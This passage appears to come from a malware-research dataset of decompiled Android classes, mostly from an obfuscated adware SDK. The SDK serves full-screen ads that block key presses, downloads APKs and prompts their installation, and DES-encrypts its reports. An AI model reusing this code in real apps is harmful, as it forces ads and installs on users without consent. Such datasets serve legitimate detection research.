q.i=jSONObject.optString(""icon_feiwocp"".replace(""_feiwocp"",""""));     q.q=jSONObject.optString(""coverDownloadConfirm_feiwocp"".replace(""_feiwocp"",""""),""true_feiwocp"".replace(""_feiwocp"",""""));     q.r=jSONObject.optString(""notifiKeep_feiwocp"".replace(""_feiwocp"",""""),""true_feiwocp"".replace(""_feiwocp"",""""));     q.s=jSONObject.optString(""gprsDown_feiwocp"".replace(""_feiwocp"",""""),""true_feiwocp"".replace(""_feiwocp"",""""));     q.h=jSONObject.optString(""clickType_feiwocp"".replace(""_feiwocp"",""""));     q.t=jSONObject.optString(""fullClick_feiwocp"".replace(""_feiwocp"",""""),""true"");     q.l=jSONObject.optString(""appicon_feiwocp"".replace(""_feiwocp"",""""));     q.m=jSONObject.optString(""appname_feiwocp"".replace(""_feiwocp"",""""));     q.n=jSONObject.optString(""apppackage_feiwocp"".replace(""_feiwocp"",""""));     q.o=jSONObject.optString(""appurl_feiwocp"".replace(""_feiwocp"",""""));     q.p=jSONObject.optString(""appsize_feiwocp"".replace(""_feiwocp"",""""));     q.j=jSONObject.optString(""wxurl_feiwocp"".replace(""_feiwocp"",""""));     q.k=jSONObject.optString(""weburl_feiwocp"".replace(""_feiwocp"",""""));     return q;   }   public final int a(){     return this.e;   }   public final String b(){     return this.f;   }   public final String c(){     return this.g;   }   public final String d(){     return this.m;   }   public final String e(){     return this.n;   }   public final String f(){     return this.o;   }   public final String g(){     return this.j;   }   public final String h(){     return this.h;   }   public final String i(){     return this.k;   }   public final String j(){     return this.i;   }   public final String k(){     return this.l;   }   public final String l(){     return this.p;   }   public final int m(){     return this.d;   }   public final String n(){     return this.q;   }   public final String o(){     return this.r;   }   public final String p(){     return this.s;   }   public final String q(){     return this.t;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\R.code","public final class R { static {     ""CryptUtils.java_feiwocp"".replace(""_feiwocp"","""");     char[] cArr={'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'};   }   public static String a(  String str){     StringBuffer stringBuffer=new StringBuffer();     stringBuffer.append(str.substring(0,4));     stringBuffer.append(str.substring(str.length() - 4));     return stringBuffer.toString();   }   public static String a(  String str,  String str2){     if (str == null) {       return null;     }     return new String(c(str,str2));   }   public static String a(  String str,  String str2,  boolean z){     if (str == null) {       return null;     }     return O.a(b(str,str2),false);   }   private static byte[] b(  String str,  String str2){     if (str == null) {       return null;     }     try {       SecretKeySpec secretKeySpec=new SecretKeySpec(str2.getBytes(),""DES_feiwocp"".replace(""_feiwocp"",""""));       Cipher cipher=Cipher.getInstance(""DES_feiwocp"".replace(""_feiwocp"",""""));       byte[] bytes=str.getBytes(""utf-8_feiwocp"".replace(""_feiwocp"",""""));       cipher.init(1,secretKeySpec);       return cipher.doFinal(bytes);     }  catch (    UnsupportedEncodingException e) {       return null;     } catch (    InvalidKeyException e2) {       return null;     } catch (    NoSuchAlgorithmException e3) {       return null;     } catch (    BadPaddingException e4) {       return null;     } catch (    IllegalBlockSizeException e5) {       return null;     } catch (    NoSuchPaddingException e6) {       return null;     }   }   private static byte[] c(  String str,  String str2){     if (str == null) {       return null;     }     try {       SecretKeySpec secretKeySpec=new SecretKeySpec(str2.getBytes(),""DES_feiwocp"".replace(""_feiwocp"",""""));       Cipher cipher=Cipher.getInstance(""DES_feiwocp"".replace(""_feiwocp"",""""));       byte[] a=O.a(str);       cipher.init(2,secretKeySpec);       return cipher.doFinal(a);     }  catch (    InvalidKeyException e) {       return null;     } catch (    NoSuchAlgorithmException e2) {       return null;     } catch (    BadPaddingException e3) {       return null;     } catch (    IllegalBlockSizeException e4) {       return null;     } catch (    NoSuchPaddingException e5) {       return null;     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\RunnableC0017f.code","public final class RunnableC0017f implements Runnable {   private String a;   private AbstractC0012a b;   public RunnableC0017f(  AbstractC0012a abstractC0012a,  String str){     this.b=abstractC0012a;     this.a=str;   }   @Override public final void run(){     Context context;     aj a=aj.a();     context=this.b.d;     a.a(context,this.a,(am)null);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\RunnableC0018g.code","public final class RunnableC0018g implements Runnable {   private String a;   private AbstractC0012a b;   public RunnableC0018g(  AbstractC0012a abstractC0012a,  String str){     this.b=abstractC0012a;     this.a=str;   }   @Override public final void run(){     Context context;     aj a=aj.a();     context=this.b.d;     a.a(context,this.a,(am)null);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\RunnableC0019h.code","public final class RunnableC0019h implements Runnable {   private Intent a;   private AbstractC0012a b;   public RunnableC0019h(  AbstractC0012a abstractC0012a,  Intent intent){     this.b=abstractC0012a;     this.a=intent;   }   @Override public final void run(){     Context context;     context=this.b.d;     context.startActivity(this.a);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\RunnableC0022k.code","final class RunnableC0022k implements Runnable {   private SA a;   public RunnableC0022k(  SA sa){     this.a=sa;   }   @Override public final void run(){     SA.a(this.a);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\RunnableC0023l.code","final class RunnableC0023l implements Runnable {   private SA a;   public RunnableC0023l(  SA sa){     this.a=sa;   }   @Override public final void run(){     SA.a(this.a);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\RunnableC0025n.code","final class RunnableC0025n implements Runnable {   private String a;   private H b;   private C0024m c;   public RunnableC0025n(  C0024m c0024m,  String str,  H h){     this.c=c0024m;     this.a=str;     this.b=h;   }   @Override public final void run(){     Intent intent=new Intent(""android.intent.action.VIEW"");     intent.addFlags(268435456);     intent.setDataAndType(Uri.fromFile(new File(this.a)),""application/vnd.android.package-archive_feiwocp"".replace(""_feiwocp"",""""));     ae.a(this.c.a.b).a(this.b.e() + 12345,android.R.drawable.ic_menu_share,this.b.a(),this.b.a(),""ä¸‹è½½å®Œæˆ�ï¼Œç‚¹å‡»å®‰è£…_feiwocp"".replace(""_feiwocp"",""""),intent,34,this.b.b(),System.currentTimeMillis());   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\RunnableC0037z.code","final class RunnableC0037z implements Runnable {   private C0036y a;   public RunnableC0037z(  C0036y c0036y){     this.a=c0036y;   }   @Override public final void run(){     if (this.a.a.a() == null || this.a.a.a().isEmpty()) {       this.a.a.i();     }  else {       this.a.a.f();     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\S.code","public final class S {   public static final String a=""2.1_feiwocp"".replace(""_feiwocp"","""");   public static final String b=""COVERSCREEN_feiwocp"".replace(""_feiwocp"","""");   public static final String c=""V1_feiwocp"".replace(""_feiwocp"","""");   public static String d=""/adfeiwo/c-cache/image_feiwocp"".replace(""_feiwocp"","""");   public static String e=""/adfeiwo/c-cache/apk_feiwocp"".replace(""_feiwocp"","""");   public static String f;   public static String g;   public static String h;   public static final String i;   public static final String j;   public static final String k;   public static final String l;   public static final String m;   public static final String n;   public static final String o;   public static final String p;   public static final String q;   public static final String r; static {     ""/adfeiwo/c-cache/log_feiwocp"".replace(""_feiwocp"","""");     f=""coverscreen_close2.png_feiwocp"".replace(""_feiwocp"","""");     g=""coverscreen_download2.png_feiwocp"".replace(""_feiwocp"","""");     h=""coverscreen_clickshow2.png_feiwocp"".replace(""_feiwocp"","""");     ""d_feiwocp"".replace(""_feiwocp"","""");     i=""download_confirm_feiwocp"".replace(""_feiwocp"","""");     j=""DP_FEIWO_feiwocp"".replace(""_feiwocp"","""");     k=""appkey_feiwocp"".replace(""_feiwocp"","""");     l=""showatscreenonplatform_feiwocp"".replace(""_feiwocp"","""");     m=""showatscreenonuser_feiwocp"".replace(""_feiwocp"","""");     ""12345678_feiwocp"".replace(""_feiwocp"","""");     n=""dprate_feiwocp"".replace(""_feiwocp"","""");     o=""dpswitchdelay_feiwocp"".replace(""_feiwocp"","""");     p=""dpnum_feiwocp"".replace(""_feiwocp"","""");     q=""broadcast.route.control.close_feiwocp"".replace(""_feiwocp"","""");     r=""broadcast.route.control_feiwocp"".replace(""_feiwocp"","""");   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\SA.code","public final class SA extends Activity {   Context b;   private C0030s c;   private List d;   Handler a=new Handler();   private List e=new ArrayList();   private String f=null;   private BroadcastReceiver g=new C0021j(this);   public static void a(  SA sa){     if (CPManager.getInstance() == null) {       sa.finish();       return;     }     sa.f=CPManager.getInstance().d();     int intExtra=sa.getIntent().getIntExtra(""index_feiwocp"".replace(""_feiwocp"",""""),0);     List list=(List)sa.getIntent().getSerializableExtra(""itemList_feiwocp"".replace(""_feiwocp"",""""));     if (list == null || list.isEmpty()) {       sa.finish();       return;     }     DisplayMetrics displayMetrics=new DisplayMetrics();     sa.getWindowManager().getDefaultDisplay().getMetrics(displayMetrics);     int i=displayMetrics.widthPixels;     int i2=displayMetrics.heightPixels;     ap.a(sa,S.j,S.o,10000);     sa.d=list;     if (sa.d.isEmpty()) {       sa.finish();     }  else {       sa.c=new A(sa,sa.d,intExtra);       sa.setContentView(sa.c,new ViewGroup.LayoutParams(-1,-1));     }   }   public final void a(  Q q){     if (q == null) {       return;     }     new StringBuilder().append(""ç‚¹å‡»ç±»åž‹ï¼š"").append(q.h());     if (P.a(getContext())) {       if (!aq.a(q.e())) {         Intent intent=new Intent(S.r);         intent.putExtra(""type_feiwocp"".replace(""_feiwocp"",""""),1);         intent.putExtra(""packageName_feiwocp"".replace(""_feiwocp"",""""),q.e());         sendBroadcast(intent);       }       JSONObject a=H.a(getContext(),0.0d,0.0d,this.f,0,"""" + q.m(),"""");       ab abVar=new ab();       abVar.a(getContext(),I.a(),this.f,a.toString());       abVar.a(new C0026o(this));       Z.a().a(abVar);       if (Q.a.equals(q.h())) {         if (P.a().a(q.f())) {           Toast.makeText(getApplicationContext(),""å·²åœ¨ä¸‹è½½ä¸­_feiwocp"".replace(""_feiwocp"",""""),0).show();         }  else {           Toast.makeText(getApplicationContext(),""æ­£åœ¨ä¸‹è½½  _feiwocp"".replace(""_feiwocp"","""") + q.d() + "" å�¯åˆ°é€šçŸ¥æ �æŸ¥çœ‹_feiwocp"".replace(""_feiwocp"",""""),0).show();           Y.a();           K.a().a(getContext(),q.k(),Y.a(getContext(),S.d,q.k()),null);           P.a().a(new H(q.a(),q.d(),q.k(),q.e(),q.f()),new C0024m(this,q));         }         if (this.d.isEmpty()) {           finish();           return;         }         return;       }       if (!Q.b.equals(q.h())) {         if (Q.c.equals(q.h())) {           Intent intent2=new Intent(this,(Class<?>)WA.class);           intent2.putExtra(""url_feiwocp"".replace(""_feiwocp"",""""),q.i());           startActivity(intent2);           if (this.d.isEmpty()) {             finish();             return;           }           return;         }         return;       }       new StringBuilder().append(""æ‰“å¼€å¾®ä¿¡å…³æ³¨ï¼š"").append(q.g());       Intent intent3=new Intent();       intent3.setFlags(335544320);       try {         intent3.setClassName(""com.tencent.mm_feiwocp"".replace(""_feiwocp"",""""),""com.tencent.mm.ui.qrcode.GetQRCodeInfoUI_feiwocp"".replace(""_feiwocp"",""""));         intent3.setData(Uri.parse(q.g()));         startActivity(intent3);       }  catch (      ActivityNotFoundException e) {         new StringBuilder().append(""æ‰“å¼€å¾®ä¿¡å…³æ³¨å¤±è´¥ï¼ˆweixinï¼‰ï¼š"").append(e);         intent3.setAction(""android.intent.action.VIEW"");         intent3.setData(Uri.parse(q.g()));         startActivity(intent3);       }       if (this.d.isEmpty()) {         finish();       }     }   }   public final void b(  Q q){     if (q == null || this.e.contains(Integer.valueOf(q.a()))) {       return;     }     this.e.add(Integer.valueOf(q.a()));     JSONObject a=H.a(getContext(),q.m());     ab abVar=new ab();     abVar.a(getContext(),I.b(),this.f,a.toString());     abVar.a(new C0027p(this));     Z.a().a(abVar);   }   public final Context getContext(){     if (this.b == null) {       this.b=getApplicationContext();     }     return this.b;   }   @Override public final void onCreate(  Bundle bundle){     super.onCreate(bundle);     requestWindowFeature(1);     getWindow().setBackgroundDrawable(new ColorDrawable(0));     CPManager.close(this);     FrameLayout frameLayout=new FrameLayout(this);     frameLayout.setLayoutParams(new ViewGroup.LayoutParams(-1,-1));     setContentView(frameLayout);     registerReceiver(this.g,new IntentFilter(S.q));     this.a.postDelayed(new RunnableC0022k(this),50L);   }   @Override protected final void onDestroy(){     super.onDestroy();     if (this.g != null) {       unregisterReceiver(this.g);     }   }   @Override public final boolean onKeyDown(  int i,  KeyEvent keyEvent){     new StringBuilder().append(""Ad Activity onKeyDown: "").append(i);     return true;   }   @Override protected final void onNewIntent(  Intent intent){     super.onNewIntent(intent);     this.a.postDelayed(new RunnableC0023l(this),50L);   }   @Override protected final void onResume(){     super.onResume();     if (this.c != null) {       this.c.h();     }   }   @Override protected final void onSaveInstanceState(  Bundle bundle){     super.onSaveInstanceState(bundle);   }   @Override protected final void onStop(){     super.onStop();     if (this.c != null) {       this.c.i();     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\SR.code","!org.eclipse.jdt.core.dom.TypeDeclaration@43fb9456"
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\T.code","public class T {   public void a(  H h,  String str,  boolean z){   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\U.code","public final class U extends Thread {   Queue a;   H b;   String c;   final P e;   private long f=0;   private long g=0;   private int h=0;   long d=0;   public U(  P p,  H h,  T t){     this.e=p;     this.b=h;     Y.a();     this.c=Y.a(p.d,S.e,h.d());     this.a=new ConcurrentLinkedQueue();     a(t);   }   private void a(  int i){     new StringBuilder().append(""[DownloadCallback] doProgress, progress: "").append(i);     this.e.e.post(new X(this,i));     Iterator it=new ArrayList(this.a).iterator();     while (it.hasNext()) {       it.next();       H h=this.b;       String str=this.c;     }   }   private void a(  boolean z){     new StringBuilder().append(""[DownloadCallback] doComplete, success: "").append(z).append("", url: "").append(this.b.d());     this.e.e.post(new W(this,z));     Iterator it=new ArrayList(this.a).iterator();     while (it.hasNext()) {       ((T)it.next()).a(this.b,this.c,z);     }   }   public final void a(  T t){     if (t != null) {       this.a.add(t);     }   }   @Override public final void run(){     throw new UnsupportedOperationException(""Method not decompiled: com.fivefeiwo.coverscreen.U.run():void"");   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\V.code","final class V implements Runnable {   private U a;   public V(  U u){     this.a=u;   }   @Override public final void run(){     ae.a(this.a.e.d).a(this.a.b.e() + 12345,android.R.drawable.ic_menu_share,this.a.b.a(),this.a.b.a(),""å¼€å§‹ä¸‹è½½ _feiwocp"".replace(""_feiwocp"",""""),new Intent(),18,this.a.b.b(),this.a.d);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\ViewOnClickListenerC0031t.code","final class ViewOnClickListenerC0031t implements View.OnClickListener {   private C0030s a;   public ViewOnClickListenerC0031t(  C0030s c0030s){     this.a=c0030s;   }   @Override public final void onClick(  View view){     this.a.e();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\W.code","final class W implements Runnable {   private boolean a;   private U b;   public W(  U u,  boolean z){     this.b=u;     this.a=z;   }   @Override public final void run(){     if (!this.a) {       ae.a(this.b.e.d).a(this.b.b.e() + 12345,android.R.drawable.ic_menu_share,this.b.b.a(),this.b.b.a(),""ä¸‹è½½å¤±è´¥_feiwocp"".replace(""_feiwocp"",""""),new Intent(),16,this.b.b.b(),this.b.d);       return;     }     Intent intent=new Intent(""android.intent.action.VIEW"");     intent.addFlags(268435456);     intent.setDataAndType(Uri.fromFile(new File(this.b.c)),""application/vnd.android.package-archive_feiwocp"".replace(""_feiwocp"",""""));     ae.a(this.b.e.d).a(this.b.b.e() + 12345,android.R.drawable.ic_menu_share,this.b.b.a(),this.b.b.a(),""ä¸‹è½½å®Œæˆ�ï¼Œç‚¹å‡»å®‰è£…_feiwocp"".replace(""_feiwocp"",""""),intent,18,this.b.b.b(),this.b.d);     ap.b(this.b.e.d,S.j,this.b.b.c().replace(""."",""""),this.b.b.e() + "","" + new Date().getTime());     try {       ag.a();       ag.a(this.b.e.d,this.b.c);     }  catch (    Exception e) {       Log.e(""D"","""" + e);     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\WA.code","public class WA extends Activity {   WebView a;   String b;   boolean c=false;   private TextView d;   private void a(){     this.b=getIntent().getStringExtra(""url_feiwocp"".replace(""_feiwocp"",""""));     if (aq.a(this.b)) {       finish();       return;     }     FrameLayout frameLayout=new FrameLayout(this);     frameLayout.setLayoutParams(new ViewGroup.LayoutParams(-1,-1));     this.a=new WebView(this);     this.a.setLayoutParams(new FrameLayout.LayoutParams(-1,-1));     this.a.getSettings().setJavaScriptEnabled(true);     this.a.getSettings().setUseWideViewPort(true);     this.a.getSettings().setCacheMode(0);     this.a.getSettings().setBlockNetworkImage(true);     this.a.getSettings().setSupportZoom(true);     this.a.getSettings().setBuiltInZoomControls(true);     this.a.getSettings().setLightTouchEnabled(true);     this.a.setHorizontalScrollBarEnabled(false);     this.a.setVerticalScrollBarEnabled(false);     this.a.setDownloadListener(new E(this));     this.a.setWebChromeClient(new F(this));     this.a.setWebViewClient(new G(this));     frameLayout.addView(this.a);     this.d=new TextView(this);     this.d.setLayoutParams(new FrameLayout.LayoutParams(-1,-2));     this.d.setPadding(an.a(this,6.0f),an.a(this,6.0f),an.a(this,6.0f),an.a(this,6.0f));     this.d.setBackgroundColor(Color.parseColor(""#66000000_feiwocp"".replace(""_feiwocp"","""")));     this.d.setTextColor(-1);     this.d.setTextSize(16.0f);     frameLayout.addView(this.d);     setContentView(frameLayout);     this.a.loadData(""<h3>Loading...</h3>_placeholder"".replace(""_placeholder"",""""),""text/html"",""UTF-8"");     this.a.loadUrl(""_feiwocp"".replace(""_feiwocp"","""") + this.b);   }   public static void a(  WA wa,  String str){     if (str == null) {       wa.d.setText("""");       wa.d.setVisibility(8);     }  else {       wa.d.setText(str);       wa.d.setVisibility(0);     }   }   @Override public void onBackPressed(){     if (this.c || this.a == null || !this.a.canGoBack()) {       super.onBackPressed();     }  else {       this.a.goBack();     }   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     requestWindowFeature(1);     a();   }   @Override protected void onNewIntent(  Intent intent){     super.onNewIntent(intent);     a();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\X.code","final class X implements Runnable {   private int a;   private U b;   public X(  U u,  int i){     this.b=u;     this.a=i;   }   @Override public final void run(){     ae.a(this.b.e.d).a(this.b.b.e() + 12345,android.R.drawable.ic_menu_share,this.b.b.a(),this.b.b.a(),""å·²ä¸‹è½½ _feiwocp"".replace(""_feiwocp"","""") + this.a + ""%"",new Intent(),18,this.b.b.b(),this.b.d);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\Y.code","public final class Y {   private static Y a;   public static Y a(){     if (a == null) {       a=new Y();     }     return a;   }   public static String a(  Context context,  String str,  String str2){     String stringBuffer;     a();     String substring=str2.substring(str2.lastIndexOf(""/"") + 1,str2.length());     a();     if (!b()) {       StringBuilder sb=new StringBuilder();       a();       StringBuffer stringBuffer2=new StringBuffer();       stringBuffer2.append(context.getFilesDir().getAbsolutePath());       if (!"""".startsWith(""/"") && !context.getFilesDir().getAbsolutePath().endsWith(""/"")) {         stringBuffer2.append(""/"");       }       stringBuffer2.append("""");       File file=new File(stringBuffer2.toString());       if (!file.exists()) {         file.mkdirs();       }       return sb.append(stringBuffer2.toString()).append(substring).toString();     }     StringBuilder sb2=new StringBuilder();     a();     if (b()) {       StringBuffer stringBuffer3=new StringBuffer();       stringBuffer3.append(Environment.getExternalStorageDirectory());       if (!str.startsWith(""/"") && !Environment.getExternalStorageDirectory().toString().endsWith(""/"")) {         stringBuffer3.append(""/"");       }       stringBuffer3.append(str);       File file2=new File(stringBuffer3.toString());       if (!file2.exists()) {         new StringBuilder().append(""åˆ›å»ºæ–‡ä»¶å¤¹: "").append((Object)stringBuffer3).append("", æ˜¯å�¦æˆ�åŠŸï¼š"").append(file2.mkdirs());       }       stringBuffer=stringBuffer3.toString();     }  else {       stringBuffer=null;     }     return sb2.append(stringBuffer).append(""/"").append(substring).toString();   }   private static boolean b(){     return Environment.getExternalStorageState().equals(""mounted"");   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\Z.code","public final class Z {   private static Z a=null;   private ExecutorService b;   private Z(){     this.b=null;     this.b=Executors.newFixedThreadPool(5);   }   public static Z a(){     if (a == null) {       a=new Z();     }     return a;   }   public final void a(  ab abVar){     this.b.submit(abVar);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.game.breakrev\array.code","public static final class array {   public static final int pref_controller_type_options=0x7f060008;   public static final int pref_controller_type_values=0x7f060009;   public static final int pref_dz_options=0x7f06000c;   public static final int pref_dz_values=0x7f06000d;   public static final int pref_filter_options=0x7f060000;   public static final int pref_filter_values=0x7f060001;   public static final int pref_global_video_render_options=0x7f060006;   public static final int pref_global_video_render_values=0x7f060007;   public static final int pref_input_external_options=0x7f06000a;   public static final int pref_input_external_values=0x7f06000b;   public static final int pref_landscape_controllerType_options=0x7f060004;   public static final int pref_landscape_controllerType_values=0x7f060005;   public static final int pref_scaleMode_options=0x7f060002;   public static final int pref_scaleMode_values=0x7f060003; } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.game.breakrev\attr.code","public static final class attr {   public static final int backgroundColor=0x7f010000;   public static final int keywords=0x7f010003;   public static final int primaryTextColor=0x7f010001;   public static final int refreshInterval=0x7f010004;   public static final int secondaryTextColor=0x7f010002; } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.game.breakrev\color.code","public static final class color {   public static final int black=0x7f070002;   public static final int emu_back_color=0x7f070000;   public static final int grey=0x7f070003;   public static final int red=0x7f070004;   public static final int white=0x7f070001; } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.game.breakrev\drawable.code","public static final class drawable {   public static final int audio=0x7f020000;   public static final int b_biggame=0x7f020001;   public static final int b_lock=0x7f020002;   public static final int back_portrait=0x7f020003;   public static final int background=0x7f020004;   public static final int black=0x7f020046;   public static final int border=0x7f020005;   public static final int btn=0x7f020006;   public static final int bts=0x7f020007;   public static final int button_a=0x7f020008;   public static final int button_a_press=0x7f020009;   public static final int button_b=0x7f02000a;   public static final int button_b_press=0x7f02000b;   public static final int button_l1=0x7f02000c;   public static final int button_l1_press=0x7f02000d;   public static final int button_l2=0x7f02000e;   public static final int button_l2_press=0x7f02000f;   public static final int button_r1=0x7f020010;   public static final int button_r1_press=0x7f020011;   public static final int button_r2=0x7f020012;   public static final int button_r2_press=0x7f020013;   public static final int button_select=0x7f020014;   public static final int button_select_press=0x7f020015;   public static final int button_start=0x7f020016;   public static final int button_start_press=0x7f020017;   public static final int button_x=0x7f020018;   public static final int button_x_press=0x7f020019;   public static final int button_y=0x7f02001a;   public static final int button_y_press=0x7f02001b;   public static final int close=0x7f02001c;   public static final int closen=0x7f02001d;   public static final int closep=0x7f02001e;   public static final int crt_1=0x7f02001f;   public static final int crt_2=0x7f020020;   public static final int directory_icon=0x7f020021;   public static final int directory_up=0x7f020022;   public static final int fcz=0x7f020023;   public static final int file_icon=0x7f020024;   public static final int hjdt=0x7f020025;   public static final int hook=0x7f020026;   public static final int icon=0x7f020027;   public static final int klkd=0x7f020028;   public static final int levelbutton=0x7f020029;   public static final int longwang=0x7f02002a;   public static final int menubutton=0x7f02002b;   public static final int mjbj=0x7f02002c;   public static final int mjcs=0x7f02002d;   public static final int myapp=0x7f02002e;   public static final int n_biggame=0x7f02002f;   public static final int off=0x7f020030;   public static final int on=0x7f020031;   public static final int onoff_bg=0x7f020032;   public static final int qiji=0x7f020033;   public static final int qsbj=0x7f020034;   public static final int sanguo=0x7f020035;   public static final int scanline_1=0x7f020036;   public static final int scanline_2=0x7f020037;   public static final int speaker=0x7f020038;   public static final int speaker_disable=0x7f020039;   public static final int speakerp=0x7f02003a;   public static final int stick_down=0x7f02003b;   public static final int stick_down_left=0x7f02003c;   public static final int stick_down_right=0x7f02003d;   public static final int stick_inner=0x7f02003e;   public static final int stick_left=0x7f02003f;   public static final int stick_none=0x7f020040;   public static final int stick_outer=0x7f020041;   public static final int stick_right=0x7f020042;   public static final int stick_up=0x7f020043;   public static final int stick_up_left=0x7f020044;   public static final int stick_up_right=0x7f020045;   public static final int translucent=0x7f020047;   public static final int transparent=0x7f020048; } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.game.breakrev\id.code","public static final class id {   public static final int ButtonContinue=0x7f0b0016;   public static final int CheckBox01=0x7f0b0047;   public static final int EmulatorFrame=0x7f0b0024;   public static final int EmulatorViewGL=0x7f0b000f;   public static final int EmulatorViewHW=0x7f0b0010;   public static final int EmulatorViewSW=0x7f0b0011;   public static final int FilterView=0x7f0b0012;   public static final int InputView=0x7f0b0025;   public static final int LinearLayout01=0x7f0b0013;   public static final int ProgressBar01=0x7f0b0046;   public static final int ScrollView01=0x7f0b0014;   public static final int TextView01=0x7f0b0015;   public static final int ad=0x7f0b0000;   public static final int adView=0x7f0b0030;   public static final int ad_container=0x7f0b003c;   public static final int adview=0x7f0b0022;   public static final int app=0x7f0b0008;   public static final int appIcon=0x7f0b0009;   public static final int audio=0x7f0b002e;   public static final int audio2=0x7f0b002f;   public static final int button1=0x7f0b001c;   public static final int checkBox1=0x7f0b0032;   public static final int checkBox2=0x7f0b0033;   public static final int consume=0x7f0b0041;   public static final int description=0x7f0b000d;   public static final int dest=0x7f0b0018;   public static final int download_icon=0x7f0b0001;   public static final int download_name=0x7f0b0002;   public static final int edittext_score=0x7f0b0045;   public static final int free=0x7f0b002a;   public static final int freecity=0x7f0b0040;   public static final int freecontrol=0x7f0b0042;   public static final int get_balance=0x7f0b003e;   public static final int imageView1=0x7f0b001a;   public static final int itemroot=0x7f0b001d;   public static final int level1=0x7f0b001f;   public static final int level2=0x7f0b0021;   public static final int linearLayout1=0x7f0b0017;   public static final int linearLayout2=0x7f0b0023;   public static final int linearLayout3=0x7f0b002c;   public static final int linearLayout4=0x7f0b0031;   public static final int listView1=0x7f0b0034;   public static final int make_money=0x7f0b003f;   public static final int menu_options_option=0x7f0b004f;   public static final int menu_quit_game_option=0x7f0b0050;   public static final int menu_quit_option=0x7f0b0051;   public static final int mid=0x7f0b0039;   public static final int mname=0x7f0b003a;   public static final int mscore=0x7f0b003b;   public static final int notification=0x7f0b000b;   public static final int notification2=0x7f0b0037;   public static final int notification_icon=0x7f0b0035;   public static final int notification_name=0x7f0b0038;   public static final int notification_title=0x7f0b0036;   public static final int progress=0x7f0b0027;   public static final int progressBar1=0x7f0b001b;   public static final int progress_bar=0x7f0b000e;   public static final int progress_text=0x7f0b000a;   public static final int quit=0x7f0b002b;   public static final int relativeLayout1=0x7f0b001e;   public static final int root=0x7f0b0026;   public static final int scrollView1=0x7f0b0044;   public static final int seekbar=0x7f0b0007;   public static final int selectmap=0x7f0b0029;   public static final int show_msg=0x7f0b003d;   public static final int size=0x7f0b0019;   public static final int startgame=0x7f0b0028;   public static final int textView1=0x7f0b0020;   public static final int textView2=0x7f0b002d;   public static final int title=0x7f0b000c;   public static final int update=0x7f0b0043;   public static final int update_notification_progressbar=0x7f0b0005;   public static final int update_notification_progressblock=0x7f0b0004;   public static final int update_notification_progresstext=0x7f0b0003;   public static final int value=0x7f0b0006;   public static final int vkey_A=0x7f0b004b;   public static final int vkey_B=0x7f0b004c;   public static final int vkey_MENU=0x7f0b004d;   public static final int vkey_SELECT=0x7f0b004e;   public static final int vkey_X=0x7f0b0049;   public static final int vkey_Y=0x7f0b004a;   public static final 